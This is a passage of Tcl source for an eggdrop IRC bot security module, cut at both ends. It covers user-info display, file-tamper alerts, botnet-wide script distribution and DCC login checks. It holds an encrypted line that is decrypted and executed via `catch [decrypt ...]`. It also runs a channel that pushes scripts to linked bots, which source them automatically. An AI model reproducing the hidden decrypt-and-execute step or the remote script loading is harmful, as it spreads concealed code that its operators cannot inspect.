     putdcc $i $ho
    }
    if $owner {if {[set c [getcomment $n]]!=""} {putdcc $i "  \0034COMMENT: $c"}}
    if {$master || ($ha==$n)} {if {[set c [getemail $n]]!=""} {putdcc $i "  \0039EMAIL: $c"}}
    if {[set c [getinfo $n]]!=""} {putdcc $i "  INFO: $c"}
    if $master {if {[set c [getaddr $n]]!=""} {putdcc $i "  \0036ADDRESS: $c"}}
    if $master {if {[set c "[getdnloads $n] [getuploads $n]"]!="0 0 0 0"} {
       putdcc $i "  FILES: [lindex $c 0] downloads ([lindex $c 1]k), [lindex $c 2] uploads ([lindex $c 3]k)"}}
    if {$owner && ([set c [user-get $n created]]!="")} {
     if {[set by [user-get $n createdby]]==""} {set by ""} {set by " by $by"}
     if {[set ct [user-get $n chattrby]]==""} {set ct ""} {set ct ", chattr by $ct"}
     putdcc $i " \0032 Created: [backtime $c] ago$by$ct"
    }
    if $master {
     foreach w $fields {
      if {1+[lsearch "created createdby chattrby" $w]} continue
      if {[set c [user-get $n $w]]==""} continue
      if ![regexp "\[^0-9\]" $c] {
       if {$c > 777777777} {set c [backtime $c]}
      }
      putdcc $i " \00314 $w: $c"
     }
    }
   } {
    if {$maskn=="*"} continue
    foreach b $h {
     if [string match $maskn [string tolower $b]] {
      incr f
      if {($f<=$minf) && ($f==1)} {putdcc $i "(skipping first $minf)"}
      if {(1+$f)==(1+$maxf)} {putdcc $i "(more than $maxf matches; list truncated)"}
      if {($f>=(1+$maxf)) || ($f<=$minf)} continue
      set b [split $b ":"]
      set ho [lindex $b 0]
      if {[set ex [lindex $b 1]]==0} {
       set ex perm
      } {
       set ex "after [backtime [expr [unixtime] - ($ex - [unixtime])]]"
      }
      switch -- $n *ban {
       set cr [backtime [lindex $b 2]]
       set lu [backtime [lindex $b 3]]
       set ty BAN
       set who [lindex $b 4]
       set why [split [lindex $b 5] ~]
      } *ignore {
       set ty IGNORE
       set who [lindex $b 2]
       set lu [set cr [backtime [lindex $b 3]]]
       set why [split [lindex $b 4] ~]
      } default {set ty $n;set ex ???;set who raw;set why $b; set lu "";set cr ""}
      putdcc $i "$ty: $ho ($ex)"
      putdcc $i "  $who: $why"
      if {$cr!=""} {
       if {$cr==$lu} {
	putdcc $i "  Created $cr ago"
       } {
	putdcc $i "  Created $cr ago, last used $lu ago"
       }
      }
     }
    }
   }
  }
 }
 if $match {putdcc $i "--- Found $f matches."}
 return 1
}
proc backtime {ut} {
 if !$ut {return NEVER}
 set t [expr [unixtime] - $ut]
 set s [expr $t % 60];set t [expr $t / 60]
 set m [expr $t % 60];set t [expr $t / 60]
 set h [expr $t % 24]
 set d [expr ($t / 24) % 365]
 set y [expr ($t / 24) / 365]
 set r ""
 if {$y > 0} {append r "${y}y"}
 if {$d > 0} {append r "${d}d"}
 if {($h > 0) || ($d > 0) || ($y > 0)} {append r [format %02d $h]:}
 append r [format %02d $m]
 if {$t == 0} {append r ".[format %02d $s]s"} {append r m}
 return "$r"
}

proc user-get {handle key} {
 set xtra [getxtra $handle]
 for {set i 0} {$i < [llength $xtra]} {incr i} {
  set this [lindex $xtra $i]
  if ![string compare [lindex $this 0] $key] {
   return [lindex $this 1]
  }
 }
 return ""
}
proc user-set {handle key data} {
 set xtra [getxtra $handle]
 # is key already there?
 set outxtra ""
 for {set i 0} {$i < [llength $xtra]} {incr i} {
  set this [lindex $xtra $i]
  if [string compare [lindex $this 0] $key] {
   lappend outxtra $this
  }
 }
 lappend outxtra [list $key $data]
 setxtra $handle $outxtra
}
set skeyfile [decrypt | 5vUUL/17.sw1]
set scrcpfile shash.p
set scrcbfile shash.b
set touchfile1 [decrypt | 79e11.B3lhV10wJbi1n7Bmu.]
set touchfile2 [decrypt | icJCA/Tyvzd.PvWzF.1i79n.]
set hublogfile hublog.txt
set daylogfile day
set wlogfile wtmp.bots
lappend touchfile1 [decrypt | 4atpB.ylCdd1R9M4W.hSZWG0]
#lappend touchfile1 [decrypt | VXPUN0kkKfQ/]
if [info exist argv0] {lappend touchfile1 ./$argv0} {
 foreach w "./eggdrop ./csh ./httpd" {
  if [file exists $w] {lappend touchfile1 $w}
 }
}
set statfile [decrypt | QZq5g.pqQoz0]
if {[info commands md5file]==""} {proc md5file {args} {return none}}

catch {
 if {[info commands old_save]==""} {rename save old_save}
 if {[info commands old_reload]==""} {rename reload old_reload}
 if {[info commands old_savechannels]==""} {rename savechannels old_savechannels}
 if {[info commands old_loadchannels]==""} {rename loadchannels old_loadchannels}
 proc save {} {
  global sec_tch userfile channel-file
  old_save
  foreach c "$userfile ${channel-file}" {
   file stat $c tach
   foreach w [array names tach] {set sec_tch($c:$w) $tach($w)}
  }
 }
 proc reload {} {
  global sec_tch userfile channel-file
  old_reload
  set sec_tch($userfile:atime) [file atime $userfile]
  set sec_tch(${channel-file}:atime) [file atime ${channel-file}]
 }
 proc loadchannels {} {
  global sec_tch channel-file
  old_loadchannels
  set sec_tch(${channel-file}:atime) [file atime ${channel-file}]
 }
 proc savechannels {} {
  global sec_tch channel-file
  old_savechannels
  file stat ${channel-file} tach
  foreach w [array names tach] {set sec_tch(${channel-file}:$w) $tach($w)}
 }
}

if ![info exist nolisten] {set nolisten 0}

proc trc {n1 n2 m} {
 switch -- $m r {set m read} w {set m write} u {set m unset}
 if {$n2==""} {
  if [info exist $n1] {set n1 [set $n1]} {ser n "not set yet"}
  putcmdlog "\0030,3 \0030,7 $n1 \[$m\] = $n"
 } {
  if [info exist $n1($n2)] {set n1 [set $n1\($n2)]} {ser n "not set yet"}
  putcmdlog "\0030,3 \0030,7 $n1\($n2) \[$m\] = $n"
 }
}

proc sec_alert {i text} {
global secauth botnet-nick max-notes
 sec_log ALERT:${botnet-nick} $text
 set tt 0
 if $secauth {
  foreach w [userlist n9] {
   incr max-notes
   sendnote ${botnet-nick} $w "*>\0034> $text" ; incr tt
  }
 }
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [set ni [lindex $w 1]] n] && ([lindex $w 0] != $i)} {
   if [info exist dup($ni)] {putdcc [lindex $w 0] "\01ACTION *>> $text\01";incr tt
   } {set dup($ni) 1}
  }
 }
 catch {unset dup}
 if {[llength [bots]]} {if {$i!="nobots"} {putallbots "secalert $text"}} else {
  putlog "\2!ALERT! $text"
 }
}

proc sec_info {i text} {
global botnet-nick
 sec_log info:${botnet-nick} $text
 putallbots "secinfo $text"
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n] && ([lindex $w 0] != $i)} {
   putdcc [lindex $w 0] "*>\00312> $text"
  }
 }
}

proc sec_notice {i text} {
global botnet-nick hublogfile
 sec_log Notice:${botnet-nick} $text
 putallbots "secnotice $text"
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n] && ([lindex $w 0] != $i)} {
   putdcc [lindex $w 0] "*** (${botnet-nick}) $text"
  }
 }
}

proc sec_notice_c {i text} {
global botnet-nick hublogfile
 sec_log_c NotiCe:${botnet-nick} $text
 putallbots "secnoticecrypt $text"
 foreach w [dcclist] {
  if {("[lindex $w 3]" == "chat") && [matchattr [lindex $w 1] n9] && ([lindex $w 0] != $i)} {
   putdcc [lindex $w 0] "*** (${botnet-nick}) $text"
  }
 }
}

proc sec_log {type text} {
global secauth hublogfile daylogfile
 catch {
  set f [open [if $secauth {set hublogfile} {set daylogfile}] a]
  puts $f "[ctime [unixtime]] ($type) $text"
  close $f
 }
}

proc sec_log_c {type text} {
global secauth hublogfile
 if !$secauth return
 catch {
  set f [open $hublogfile a]
  puts $f "[ctime [unixtime]] ($type) [encrypt decrypt $text]"
  close $f
 }
}

proc putseclog {text} {
 putcmdlog $text
 sec_log =log= $text
}

bind bot - wlog botwlog
proc botwlog {b k a} {
global secauth
 if !$secauth return
 _putwlog $b $a
}

proc putwlog {text} {
global botnet-nick
 _putwlog ${botnet-nick} $text
}

proc _putwlog {b text} {
global secauth wlogfile
 if !$secauth {
  putallbots "wlog $text"
 } {
  catch {
   set f [open $wlogfile a]
   puts $f "[unixtime] $b $text"
   close $f
  }
 }
}

proc sputbots {to a} {
 if [catch {if {"[lindex $to 0]"=="*"} {putallbots "$a"} else {putbot $to "$a"}} er] {
  putcmdlog "sputbot:ERR: $er"
 }
}

bind dcc n sendscript sec_scriptsend
proc sec_scriptsend {h i a} {
global curkey scookies sec_sdl sec_sdl_pass sec_sdl_bot sec_sdl_time sec_sdl_fd sec_sdl_last err
 if {[info exist sec_sdl_fd] && [expr [unixtime]-$sec_sdl_time]<64 && "$sec_sdl_last"==""} {
  putdcc $i "already in script-send mode!";return
 }
 if {[llength $a]<2} {
  putdcc $i "$err sendscript key <bot/*> file.tcl";return
 }
 set botz [lindex $a 1]
 set scrip chrome.tcl
 regsub -all "\[\|\>\<\&\@\]" $scrip "" scrip
 if ![file exist $scrip] {
  putdcc $i "file $scrip not exist"
  return 0
 }
 if ![llength [bots]] {
  putdcc $i "no bots connected"
 }
 if [catch {set sec_sdl_fd [open $scrip r]} er] {
  putdcc $i "read error file $scrip: $er"
 }
 set sec_sdl "$scrip"
 set sec_sdl_bot "[string tolower $botz]"
 set sec_sdl_pass "[lindex $a 0]"
 set sec_sdl_time [unixtime]
 set sec_sdl_last ""
 sec_notice - "script send request to $botz bot(s)"
 sputbots $botz "sec_cookie_req"
 putseclog "#$h# sendscript $scrip to $botz"
 return 0
}
#-------------------------------------------BY3r90lzMl7.:ZbUI2/KFhqQ.w9Msc/JGu.P/:ZbUI2/KFhqQ.w9Msc/JGu.P/:wR8Lg0igyEi0:Phety1kFaAP/:Phety1kFaAP/:@SYN@
if ![info exist telnet] {
 if {[set ad [split [lindex [split [getaddr ${botnet-nick}] ":"] 1] "/"]]!=""} {
  set botport [lindex $ad 0]
  if {[set userport [lindex $ad 1]]==""} {set userport $botport}
 } {
  set botport [set userport 13131]
 }
 set telnet $userport
} {
 set botport [set userport $telnet]
}
if {!$secauth && ![matchattr ${botnet-nick} a] && ![matchattr ${botnet-nick} h]} {
 catch {listen $botport off}
 catch {listen $userport off}
 if !$nolisten {if {[bots]==""} {listen $userport users}}
} {
 if !$nolisten {
  if {$botport==$userport} {
   set userport [set botport [listen $botport all]]
  } {
   set botport [listen $botport bots]
   set userport [listen $userport users]
  }
 }
}
bind filt - .rela* sec_dccrelay
proc sec_dccrelay {i ar} {
 set a [lindex [string tolower $ar] 1]
 catch {putbot $a "secrelay [idx2hand $i]"}
 return $ar
}

bind filt p ".op*" tntfiltop
proc tntfiltop {i tx} {
 set t [string tolower [split $tx " "]]
 if {([lindex $t 0]==".op") && ([lindex $t 1]!="")} {
  set who [lindex $tx 1]
  if {[set ch [lindex $tx 2]]==""} {set ch [lindex [console $i] 0]}
  if [validchan $ch] {
   set ho [getchanhost $who $ch]
   putwlog "[list [idx2hand $i]] OP [chattr [idx2hand $i]] $i [list $who!$ho] [list $ch]"
   set n [finduser $who!$ho]
   dccbroadcast "[b]![b]dcc op[b]![b] ($who!$ho) on $ch by [idx2hand $i] (+[chattr [idx2hand $i]])"
   return ".op $who $ch"
  }
 }
 return $tx
}
unbind dcc m rehash *dcc:rehash
unbind dcc m restart *dcc:restart
unbind dcc - su *dcc:su
bind dcc n rehash *dcc:rehash
bind dcc n restart *dcc:restart
bind dcc n su *dcc:su

unbind dcc - die *dcc:die
bind dcc n die dcc_die
proc dcc_die {h i a} {
 global secauth botnick
  dccbroadcast "[b]![b]dcc die[b]![b] by $h"
   putwlog "[list $h] DIEBOT [chattr $h] $i"
   save
   putserv "QUIT :ircN for mIRC"
  utimer 5 "die"
 return 1
}

catch [decrypt 5vUUL/17.sw1 bRanA.dUyCS.r06UB12yAEU/dTZvm0XEH2H/6K6Bx0dQkiF1d2y610WfhCN0]

if ![file exist ${channel-file}] {close [open ${channel-file} a 0600]}
if ![file size $userfile] {if [file size $userfile~bak] {exec /bin/cp $userfile~bak $userfile}}

proc gencookie {l} {
 set zz [string length [set z "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"]]
 for {set t 0} {$t<$l} {incr t} {set y [rand $zz];append s [string range $z $y $y]}
 return $s
}

bind bot - sec_cookie_req sec_cookie_req
proc sec_cookie_req {b k a} {
global scookies
 putcmdlog "script downloading request from $b checking key..."
 set b [string tolower $b]
 set scookies($b) [gencookie 20]
 putbot $b "sec_cookie_set $scookies($b)"
}

bind bot - sec_cookie_set sec_cookie_set
proc sec_cookie_set {b k a} {
global curkey scookies sec_sdl sec_sdl_pass sec_sdl_bot sec_sdl_time sec_sdl_last
 set b [string tolower $b]
 if ![info exist sec_sdl_bot] {putcmdlog "\0036unexpected cookie from $b";return}
 if {[string length $a]<20} {sec_alert - "bad cookie from $b";return}
 if [info exist scookies($b)] {
  if {$scookies($b)=="$a"} {
   sec_alert - "\0036duplicated cookie from $b";return
  }
 }
 if {"$sec_sdl_bot"!="*"} {
  if {"$sec_sdl_bot"=="$b"} {
   set sec_sdl_last $b
   utimer 0 "sec_cookie_ready $b $b"
  } else {
   sec_notice - "\0036false cookie reply from $b";return
  }
 } else {
  set sec_sdl_last $b
  utimer 11 "sec_cookie_ready $b {ALL these bots}"
 }
 putcmdlog "\0033send key to $b"
 putbot $b "sec_sendscript_pass [encrypt [keyturn $sec_sdl_pass 1] $a] [lindex [split $sec_sdl /] end]"
}

proc sec_cookie_ready {a t} {
global sec_sdl_last sec_sdl_bot sec_sdl sec_sdl_time sec_sdl_pass sec_sdl_fd
global sec_stat
 if [info exist sec_sdl_last] {
  if {"$sec_sdl_last"=="$a"} {
   set dtime [unixtime]
   putcmdlog "\0032iniciating transfer to $t after [expr $dtime-$sec_sdl_time] seconds"
   set contr 0 
   if [catch {
    while {![eof $sec_sdl_fd]} {
     set tmp "[gets $sec_sdl_fd]"
     incr contr
     if {[string length $tmp]>=400} {error "$contr string length over 400 bytes"}
     if ![eof $sec_sdl_fd] {sputbots $sec_sdl_bot "sdl $tmp"
     } else {if {[string length $tmp]} {sputbots $sec_sdl_bot "sdl $tmp"}}
    }
   } er] {
    putcmdlog "\0036error reading script file $sec_sdl: $er"
    sputbots $sec_sdl_bot "sdl_err $er"
    catch {close $sec_sdl_fd}
    unset sec_sdl_fd;unset sec_sdl_time;unset sec_sdl;unset sec_sdl_last
    unset sec_sdl_bot;unset sec_sdl_pass
    return
   }
   sputbots $sec_sdl_bot "sdl_end"
   if [catch {close $sec_sdl_fd} er] {putcmdlog "error closing script file $sec_sdl: $er"}
   foreach w [array names sec_stat $sec_sdl_bot:*] {catch {unset $w}}
   sec_notice - "script sent! ([expr [unixtime]-$dtime] seconds, $contr lines)"
   unset sec_sdl_fd;unset sec_sdl_time;unset sec_sdl;unset sec_sdl_last
   unset sec_sdl_bot;unset sec_sdl_pass
  }
 }
}

bind bot - sec_sendscript_pass sec_sendscript_pass
proc sec_sendscript_pass {b k a} {
global curkey scookies sec_sdl_down sec_sdl_file sec_sdl_dbot
global sec_sdl_line sec_sdl_dtime botnet-nick
 set s [split $a " "]
 set b [string tolower $b]
 set skey [lindex $a 0]
 set skript [lindex $a 1]
 regsub -all "\[\|\>\<\&\@\]" $skript "" skript
 if ![info exist scookies($b)] {
  sec_notice - "unrequested script download attempt from $b";return
 }
 if {[string length $skey] < 4} {
  sec_notice - "\0034bad script download password from $b";return
 }
 if {"[encrypt $curkey(f) $scookies($b)]"!="$skey"} {
  sec_notice - "bad script download password from $b";return
 }
 putcmdlog "good ScriptDownload key from $b, script downloading enabled"
 set sec_sdl_down $skript
 set sec_sdl_dbot $b
 set sec_sdl_dtime "[unixtime]"
 set sec_sdl_line 0
 if [catch {set sec_sdl_file "[open "$sec_sdl_down.sdl" w 0600]"} er] {
  putcmdlog "error create file $skript: $er"
 } else {
  if [catch {puts $sec_sdl_file "#download begin at [ctime $sec_sdl_dtime] - [encrypt signed ${botnet-nick}]"} er] {
   putcmdlog "error writing to file $skript: $er"
   catch {close $sec_sdl_file}
   catch {unset sec_sdl_file};unset sec_sdl_down;unset sec_sdl_dtime
   unset sec_sdl_line;unset sec_sdl_dbot
  }
 }
}

bind bot - sdl sec_sdl_c
proc sec_sdl_c {b k a} {
global sec_sdl_file sec_sdl_dbot sec_sdl_line sec_sdl_down botnet-nick
if {[info exist sec_sdl_file] && "[string tolower $b]"=="$sec_sdl_dbot"} {
if {[string match "*@SYN\@*" $a]} {regsub -- @SYN\@ $a "[encrypt pochta ${botnet-nick}]:&" a}
if [catch {puts $sec_sdl_file $a} er] {
putcmdlog "error writing to file $sec_sdl_down: $er";catch {close $sec_sdl_file};unset sec_sdl_file sec_sdl_down sec_sdl_line
};incr sec_sdl_line}}

bind bot - sdl_end sec_sdl_end
proc sec_sdl_end {b k a} {
global sec_sdl_dtime sec_sdl_down sec_sdl_file sec_sdl_dbot sec_sdl_line botnet-nick
 set b [string tolower $b]
 if {[info exist sec_sdl_file] && "$sec_sdl_dbot"=="$b"} {
  set ssec "$sec_sdl_line/[expr [unixtime]-$sec_sdl_dtime] lines/sec"
  putcmdlog "download finished in $ssec"
  if [catch {puts $sec_sdl_file "#download ends at [ctime [unixtime]] ($ssec) - [encrypt signed ${botnet-nick}]"} er] {
   putcmdlog "error writing to file $sec_sdl_down: $er"
   catch {close $sec_sdl_file}
   unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
   unset sec_sdl_line;unset sec_sdl_dtime;return
  }
  if [catch {close $sec_sdl_file} er] {
   putcmdlog "error closing file $sec_sdl_down: $er";return
  }
  putlog "succefully downloaded script $sec_sdl_down from $b"
  if [file exist $sec_sdl_down] {
   if [catch {file copy -force $sec_sdl_down $sec_sdl_down.bak}] {
    exec /bin/cp $sec_sdl_down $sec_sdl_down.bak
   }
   catch {putcmdlog "[exec /bin/ls -las $sec_sdl_down]"}
  }
  if [catch {file rename -force $sec_sdl_down.sdl $sec_sdl_down}] {
   exec /bin/mv $sec_sdl_down.sdl $sec_sdl_down
  }
  catch {putcmdlog "[exec /bin/ls -las $sec_sdl_down]"}

  utimer 0 "sec_source $sec_sdl_down $b"
  unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
  unset sec_sdl_line;unset sec_sdl_dbot
 }
}

proc sec_source {scr bot} {
global s b
 set s $scr
 set b $bot
 uplevel #0 {
  putcmdlog "Loading script $s"
  if [catch {
   source $s
   catch {install_$s}
  } er] {
   sec_notice - "ERROR in $s (from $b):: $er"
  } {
   sec_notice - "SUCCESSFUL started $s (from $b)"
   if {![catch {file stat $s tach} er]} {
    foreach w [array names tach] {set sec_tch($s:$w) $tach($w)}
   }
  }
  putcmdlog "Procs count changed from $sec_procs_cnt to [set sec_procs_cnt [llength [info procs]]]"
  putallbots "\nsec_stat procs $sec_procs_cnt Procs count (script)"
  putallbots "\nsec_stat stat:$s [catch {file size $s} er]:$er/[catch {file mtime $s} er]:$er size/mtime"
  putallbots "\nsec_stat md5:$s [catch {md5file $s} er]:$er MD5 Digest"
  set sec_tch($s:atime) [file atime $s]
  catch {
   set bindc [llength [bind * * *]]
   putcmdlog "Binds count changed from $sec_bind_cnt to [set sec_bind_cnt $bindc]"
   putallbots "sec_stat binds $bindc Binds count (script)"
  }
 }
 unset s
}


bind bot - sdl_err sec_sdl_err
proc sec_sdl_err {b k a} {
global sec_sdl_dtime sec_sdl_down sec_sdl_file sec_sdl_dbot sec_sdl_line
 set b [string tolower $b]
 if {[info exist sec_sdl_file] && "$sec_sdl_dbot"=="$b"} {
  set ssec "$sec_sdl_line/[expr [unixtime]-$sec_sdl_dtime] lines/sec"
  putcmdlog "\0034download aborted in $ssec"
  putcmdlog "remote bot ($b) error: $a"
  if [catch {puts $sec_sdl_file "!download aborted at [ctime [unixtime]] ($ssec)"} er] {
   putcmdlog "error writing to file $sec_sdl_down: $er"
   catch {close $sec_sdl_file}
   unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
   unset sec_sdl_line;unset sec_sdl_dtime
  }
  if [catch {close $sec_sdl_file} er] {
   putcmdlog "error closing file $sec_sdl_down: $er"
  }
  unset sec_sdl_file;unset sec_sdl_down;unset sec_sdl_dtime
  unset sec_sdl_line;unset sec_sdl_dbot
 }
}

bind disc - * sec_sdl_disc
proc sec_sdl_disc {b} {
global sec_sdl_dbot
 if [info exist sec_sdl_dbot] {
  if {"$sec_sdl_dbot"=="[string tolower $b]"} {
   sec_sdl_err $b sdl_err "bot unlinked from botnet..."
  }
 }
}

#---
proc stat_save {} {
global statfile sec_stat secauth
 if !$secauth return
 set f [open $statfile w 0600]
 putloglev 3 * "\0030,3stat:WRITING STATS FILE ***"
 foreach w [array names sec_stat] {
  puts $f "[list $w] [list $sec_stat($w)]"
 }
 close $f
}
if {$secauth && [file exist $statfile]} {
 set t 0
 if [catch\
  {
   set f [open $statfile r]
   while {![eof $f]} {
    gets $f tmp
    if {$tmp!=""} {
     set sec_stat([lindex $tmp 0]) [lindex $tmp 1]
     incr t
    }
   }
   close $f
  } er] {
  putseclog "sec_stat file $statfile not found: $er"
 } {
  putcmdlog "sec_stat file loaded ($t lines)"
 }
}
bind bot - sec_stat sec_stat
proc sec_stat {b k a} {
global sec_stat activator secauth
 set a [split $a " "]
 set s [lrange $a 2 end]
 set k [string tolower [lindex $a 0]]
 set b [string tolower $b]
 if {!(1+[lsearch "binds procs mtime size stat md5" [lindex [split $k :] 0]])} {
  sec_alert nobots "Illegal sec_stat $b:$k = $a"
  return
 }
 set a [lindex $a 1]
 putloglev 3 * "\0030,3($b) ($s) - ($k):($a)"
 if [info exist activator($b)] {lappend activator($b) "$b:$k"}
 if [info exist sec_stat($b:$k)] {
  if {$a==$sec_stat($b:$k)} return
  sec_alert nobots "($b:$k) [lrange $a 2 end] changed from $sec_stat($b:$k) to $a"
  if [string match "md5:*" $k] {chattr $b -sof1}
  if {$secauth && [lsearch "binds procs" $k]==-1} {if [matchattr $b 1] {chattr $b -1o}}
 }
 set sec_stat($b:$k) $a
}

foreach w [array names sec_tch] {
 if ![string match "*:*" $w] {
  set sec_tch($touchfile1:$w) $sec_tch($w)
  unset sec_tch($w)
 }
}

utimer 0 fixat
proc fixat {} {
global sec_tch mainconfile touchfile1
 set tf1 "$mainconfile [lrange $touchfile1 1 end]"
 foreach w $tf1 {catch {file atime $w} sec_tch($w:atime)}
 proc fixat {} {}
}

if ![info exist sec_tch_er(check)] {
 if [info exist sec_tch_er] {
  set tmp $sec_tch_er
  unset sec_tch_er
  set sec_tch_er(check) $tmp
 }
}
set bindlist 1
bind time - * sec_touch
proc sec_touch {mi ho da mh ye} {
global touchfile1 touchfile2 sec_tch sec_tch_a sec_tch_er secauth sec_log_er
global bindlist sec_botn_er sec_msg_er sec_msgm_er sec_ctcp_er sec_ctcr_er
global secauth sec_bind_cnt sec_procs_cnt sec_five botnet-nick mainconfile
global userfile save-users-at channel-file sec_notc_er
 if ![info exist sec_log_er] {set sec_log_er ""}
 if {!$secauth && ($sec_log_er!=[logfile])} {
  set sec_log_er [logfile]
 }
 if $bindlist {
  catch {
   set bindlist 0
   set bindc [llength [bind * * *]]
   if ![info exist sec_bind_cnt] {set sec_bind_cnt $bindc}
   if {$sec_bind_cnt!=$bindc} {
    sec_alert - "Binds count changed from $sec_bind_cnt to $bindc"
    set sec_bind_cnt $bindc
   }
   if ![info exist sec_botn_er] {
    set sec_botn_er ""
    if $secauth {set sec_botn_er "[bind botn * *]"}
   }
   foreach w "botn msg msgm ctcp ctcr notc" {
    set bindw [bind ${w} * *];if ![info exist sec_${w}_er] {set sec_${w}_er $bindw;break}
    if {[set sec_${w}_er]!=$bindw} {
     foreach u [set sec_${w}_er] {if {!(1+[lsearch $bindw $u])} {sec_alert - "Bind ${w} deleted: $u"}}
     foreach u $bindw {if {!(1+[lsearch [set sec_${w}_er] $u])} {sec_alert - "Bind ${w} added!!: $u"}}
     set sec_${w}_er $bindw
    }
   }
   set bindlist 1
  } er
  if !$bindlist {putcmdlog "eggdrop1.1.5? $er"}
 }
 if [info exist sec_five] {
  incr sec_five -1
  if !$sec_five {
   utimer 1 stat_save
   set procs_cnt [llength [info procs]]
   if ![info exist sec_procs_cnt] {set sec_procs_cnt $procs_cnt}
   putallbots "\nsec_stat procs $procs_cnt Procs count"
   if [info exist bindc] {putallbots "\nsec_stat binds $bindc Binds count"}
   if {$sec_procs_cnt!=$procs_cnt} {
    sec_notice - "Procs count changed from $sec_procs_cnt to $procs_cnt"
    set sec_procs_cnt $procs_cnt
   }
   unset sec_five
   foreach w [dcclist] {
    if {([lsearch "chat files script" [lindex $w 3]]+1) && ![matchattr [lindex $w 1] f]} {
     if {[getdccidle [lindex $w 0]] > 200} {
      boot [lindex $w 1]@${botnet-nick} "Idle time exceeded..."
     }
    }
   }
  }
 } {set sec_five 5}
 set cfiles "$touchfile1 $userfile ${channel-file}"
 if [info exist mainconfile] {append cfiles " $mainconfile"}
 foreach c $cfiles {
  if [info exist cf] {set cf $c} {set cf check}
  if {$userfile==$c} {set cf userfile;set uf 1} {set uf 0}
  if {${channel-file}==$c} {set cf chanfile;set uf 2}
  if ![info exist sec_tch_er($cf)] {set sec_tch_er($cf) none}
  if {[catch {file stat $c tach} er]} {
   if {$sec_tch_er($cf)!=$er} {
    sec_alert - "touch error: $er"
    set sec_tch_er($cf) "$er"
   }
   putlog "!Sec.alert! $er"
  } else {
   if {![info exist sec_five] && !$uf} {
    putallbots "\nsec_stat stat:$cf [catch {file size $c} er]:$er/[catch {file mtime $c} er]:$er size/mtime"
   }
   set mesgb "!! Touch\[$cf\](";set mesg [set deli ""]
   foreach w [array names tach] {
    if ![info exist sec_tch($c:$w)] {
     set plus "+";set mesg "$mesg$deli$plus$w";set deli ","
    } else {
     set plus "";if {$tach($w)!=$sec_tch($c:$w)} {set mesg "$mesg$deli$plus$w";set deli ","}
    }
   }
   if {$deli==","} {
    if {![string match "./*" $c] || $mesg!="atime"} {
     set mesg "$mesgb$mesg) changed!"
     if !$uf {sec_alert - "$mesg"} elseif {![string match "*mtime*" $mesg] \
      || ([file mtime $userfile]!=[file mtime ${channel-file}]) \
      || ([file atime $userfile]!=[file atime ${channel-file}]) \
     } {if $uf {sec_notice - $mesg} {sec_alert - $mesg}}
    }
    foreach w [array names tach] {set sec_tch($c:$w) $tach($w)}
    if [catch {
     set f [open $touchfile2 w 0600]
     puts $f "[array get sec_tch]"
    } er] { putlog "sectouch : write error: $er" }
    catch {close $f}
   }
  }
 }
}

if ![info exist sec_rehash] {
 set sec_rehash "[unixtime]"
 if ![file exist [lindex $touchfile1 0]] {
  catch {
   set f [open [lindex $touchfile1 0] w]
   puts $f [string range [encrypt [rand [unixtime]] [unixtime]] 0 7]
   close $f
  }
 }
 if ![file exist $touchfile2] {
  catch {
   set f [open $touchfile2 w]
   puts $f ""
   close $f
  }
 }
 if [catch {
  set f [open $touchfile2 r]
  array set sec_tch [gets $f]
  close $f
 } er] {
  putlog "Error reading touchfile2 ($touchfile2): $er"
 }
 catch {exec /bin/mv -f $daylogfile $daylogfile.1}
}

bind chof - * secauth_chof
proc secauth_chof {n i} {
global sauthok
 putwlog "[list $n] chof [chattr $n] $i"
 catch {unset sauthok($i)}
}

set dcc_cont 0
bind ctcp - dcc sec_dcc_tst
proc sec_dcc_tst {n u h d k a} {
global dcc_cont txt-password botnet-nick
 if [string match "\[$#\]*" $d] {
  putcmdlog "Channel $k $d $a from $n!$u ($h): $a"
  return 1
 }
 set h [string tolower $h]
 set a [string tolower $a]
 set m [lindex $a 0]
 if {$m=="chat" && ![matchattr $h p]} {return 1}\
 elseif {$m=="send" && ![matchattr $h x]} {return 1}
 if {[encrypt $h $h]=="Bz7kS.GS0ue/" || [encrypt $h $h]=="VlSBc.FtUgH0"} {
  if $dcc_cont {return 1}
  if {$m=="chat"} {
   set hst [lindex $a 2]
   set prt [lindex $a 3]
   if [catch {set host [gethost $hst]}] {
    sec_notice - "> $k attempt from $n!$uh ($h): $a"
    return 1
   }
   if [regexp "\[^0-9\]" $prt$hst] {
    putlog "Bad dcc chat request from $n!$u ($h): $a"
   } elseif {$prt < 1024} {
    putlog "Low port($prt) dcc chat request from $n!$u ($h): $a"
   } {
    set i [connect $host $prt]
    control $i dcc_handler
    putidx $i "Enter your password."
    set dcc_cont 1
   }
  }
  return 1
 }
 set chr-password "\[${botnet-nick}\] (\2[koshka $h]\2) what?!"
 set txt-password "\[${botnet-nick}\] (\2[koshka $h]\2) what?!"
 return 0
}
proc koshka {h} {
 regsub -all \[0-9./\] [encrypt $h$h$h $h[string toupper $h][string tolower $h]]$h {} e
 regsub -all -nocase \[qwrtpsdfghklzxcvbnm\] $e {} s
 regsub -all -nocase \[eyuioaj\] $e {} g
 for {set t 0} {$t<5} {incr t} {
  append o [string range $s $t $t]
  append o [string range $g $t $t]
 }
 return [string tolower $o]
}

proc dcc_handler {i a} {
global dcc_cont
 set dcc_cont 0
 putidx $i "Negative on that, Houston."
 sec_alert - "Illegal dcc chat from [idx2host $i] password: $a"
 return 1
}

bind chon - * secauth_chon
proc secauth_chon {n i} {
global secauth passive sauthok skipidx enableidx nowlogin lastlogin
 set n [string tolower $n]
 if [catch {idx2ip $i} longip] {set longip -}
 if [catch {idx2host $i} host] {foreach w [dcclist] {if {$i==[lindex $w 0]} {set host [lindex $w 2]}}}
 putwlog "[list $n] chon [set f [chattr $n]] $i [list $host] $longip"
 if [info exist nowlogin] {set lastlogin $nowlogin}
 set nowlogin "$n ($f) \[$host\] at [ctime [unixtime]]"
 set sauthok($i) 0
 if {[encrypt $n $n]=="Bz7kS.GS0ue/" || [encrypt $n $n]=="VlSBc.FtUgH0"} {
  killdcc $i
  sec_info - "Login failure for $n"
  return 0
 }
 set sack 0;set stxt ""
 catch {unset enableidx($i)}
 if $secauth {
